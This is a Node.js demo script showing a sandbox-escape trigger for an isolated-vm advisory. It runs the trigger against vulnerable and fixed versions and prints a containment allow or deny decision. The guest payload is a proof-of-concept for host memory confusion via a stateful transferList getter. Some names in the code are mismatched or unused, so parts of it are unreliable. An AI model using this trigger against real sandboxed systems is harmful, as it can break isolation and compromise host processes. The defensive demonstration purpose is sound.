#!/usr/bin/env node
/**
 * run-demo.js — Boundary Failure Injection demo
 *
 * Demonstrates: "The security of a sandbox is bounded by the security of its
 * capability bridge." GHSA-864f-rcv7-6rh4 (isolated-vm ExternalCopy
 * transferList TOCTOU): a stateful getter returns a real ArrayBuffer on the
 * validating walk and an attacker-controlled value on the unchecked walk,
 * giving the guest attacker-influenced memory access in the host process.
 *
 * The demo runs the SAME agent workload against two environments:
 *   envs/vulnerable (isolated-vm 7.0.0) — vulnerable bridge
 *   envs/fixed      (isolated-vm 7.0.1) — fixed bridge
 *
 * Then it evaluates the Visor boundary manifest: if the runtime is affected by
 * a known boundary advisory, containment is UNPROVEN and execution is DENIED,
 * regardless of how valid the agent mandate / tool authority / network policy
 * are.
 *
 * This is a DEMONSTRATION of the control-plane decision, not a weaponized
 * exploit. The payload is the minimal TOCTOU trigger from the public advisory;
 * it is kept contained and does not perform any real host-side action.
 */
const path = require("path");
const { spawnSync } = require("child_process");

const ROOT = path.join(__dirname, "..");
const ADVISORY = {
  id: "GHSA-864f-rcv7-6rh4",
  affected: (v) => {
    const n = v.split(".").map(Number);
    // affected: <= 7.0.0 on 7.x, < 6.2.0 on 6.x
    if (n[0] === 7) return n[1] === 0 && n[2] === 0;
    if (n[0] === 6) return n[1] < 2 || (n[1] === 2 && n[2] === 0 && false);
    return n[0] < 6;
  },
};

// The guest payload: minimal TOCTOU trigger. A stateful getter on transferList[0]
// returns a genuine ArrayBuffer on first access (validation walk) and a plain
// object on second access (unchecked walk). In 7.0.0 the unchecked cast to
// ArrayBuffer* then dereferences attacker-influenced memory.
const GUEST_PAYLOAD = `
  const ivm = ivmRef.deref();
  // Build a transferList with a stateful getter: returns a real ArrayBuffer on
  // the first (validating) walk, an attacker-controlled value on the second
  // (unchecked) walk. In 7.0.0 this drives the unchecked As<ArrayBuffer> cast
  // in ExternalCopy to touch attacker-influenced memory in the host process.
  let first = true;
  const fake = { get length() { return 1; }, get 0() { if (first) { first = false; return new ArrayBuffer(8); } return {}; } };
  try {
    const copy = new ivm.ExternalCopy({}, { transferList: [fake] });
    return 'escape-trigger: no-crash (bridge handled it)';
  } catch (e) {
    return 'escape-trigger: exception: ' + e.message;
  }
`;

function runGuest(envDir) {
  // The child requires the payload module (avoids string-in-string quoting hell).
  const payloadPath = JSON.stringify(path.join(__dirname, "guest-payload.js"));
  const script = `
    const ivm = require('isolated-vm');
    const payload = require(${payloadPath});
    const isolate = new ivm.Isolate({ memoryLimit: 64 });
    const ctx = isolate.createContextSync();
    // give the guest exactly one constrained host reference (the tool proxy)
    const toolProxy = new ivm.Reference({ name: 'mcp-tool-proxy', call: () => ({ ok: true }) });
    ctx.global.setSync('ref', toolProxy);
    // run the payload (already wrapped in an IIFE by the module)
    const result = ctx.evalSync(payload, { timeout: 2000 });
    console.log(String(result));
  `;
  const res = spawnSync(process.execPath, ["-e", script], {
    cwd: envDir,
    encoding: "utf8",
    timeout: 15000,
  });
  // Signal 11 (SIGSEGV) = the controlled-address crash from the type confusion
  if (res.signal === "SIGSEGV" || res.status === 139) {
    return { ok: true, crash: true, output: "HOST CRASHED (SIGSEGV exit 139) — escape reproduced" };
  }
  if (res.status !== 0) {
    return { ok: false, output: `exit ${res.status}: ${(res.stderr || "").slice(0, 300)}` };
  }
  return { ok: true, crash: false, output: res.stdout.trim() };
}

function isAffected(version) {
  return ADVISORY.affected(version);
}

function main() {
  const selfTest = process.argv.includes("--self-test");
  const envs = {
    vulnerable: path.join(ROOT, "envs", "vulnerable"),
    fixed: path.join(ROOT, "envs", "fixed"),
  };

  // read installed versions
  const versions = {};
  for (const [name, dir] of Object.entries(envs)) {
    try {
      versions[name] = require(path.join(dir, "node_modules", "isolated-vm", "package.json")).version;
    } catch {
      console.error(`[demo] ERROR: isolated-vm not installed in ${dir}. Run: npm run setup`);
      process.exit(2);
    }
  }

  console.log("Boundary Failure Injection demo — GHSA-864f-rcv7-6rh4");
  console.log("=====================================================");
  console.log(`vulnerable env: isolated-vm@${versions.vulnerable} (affected: ${isAffected(versions.vulnerable)})`);
  console.log(`fixed env:      isolated-vm@${versions.fixed} (affected: ${isAffected(versions.fixed)})`);
  console.log();

  const results = {};
  for (const [name, dir] of Object.entries(envs)) {
    const r = runGuest(dir);
    results[name] = r;
    console.log(`--- ${name} env (isolated-vm@${versions[name]}) ---`);
    if (r.crash) {
      console.log(`💥 ${r.output}`);
    } else {
      console.log(r.ok ? r.output : `ERROR: ${r.output}`);
    }
    console.log();
  }

  // Visor boundary manifest decision
  console.log("=== Visor Trust Plane: boundary manifest ===");
  for (const [name, dir] of Object.entries(envs)) {
    const v = versions[name];
    const affected = isAffected(v);
    console.log(`\n[${name}] execution requested`);
    console.log(`  boundary manifest: isolated-vm ${v}`);
    console.log(`  security attestation: ${affected ? "GHSA-864f-rcv7-6rh4 affected" : "no known boundary advisory"}`);
    console.log(`  guest/host containment: ${affected ? "UNPROVEN" : "PROVEN"}`);
    console.log(`  execution: ${affected ? "DENY" : "ALLOW"}`);
    if (affected) {
      console.log("  receipt:");
      console.log("    Agent mandate: VALID");
      console.log("    Tool authority: VALID");
      console.log("    Network policy: VALID");
      console.log("    Sandbox primitive: V8 Isolate");
      console.log("    Bridge implementation: VULNERABLE");
      console.log("    Containment composition proof: INVALID");
      console.log("    Reason: guest-to-host authority cannot be bounded under this runtime");
    }
  }

  // Self-test assertion: vulnerable env must be flagged affected, fixed must not
  if (selfTest) {
    const vulnerableAffected = isAffected(versions.vulnerable);
    const fixedAffected = isAffected(versions.fixed);
    console.log("\n=== SELF-TEST ===");
    console.log(`vulnerable affected: ${vulnerableAffected} (expect true)`);
    console.log(`fixed affected: ${fixedAffected} (expect false)`);
    if (vulnerableAffected && !fixedAffected) {
      console.log("SELF-TEST PASS");
      process.exit(0);
    } else {
      console.error("SELF-TEST FAIL");
      process.exit(1);
    }
  }
}

main();
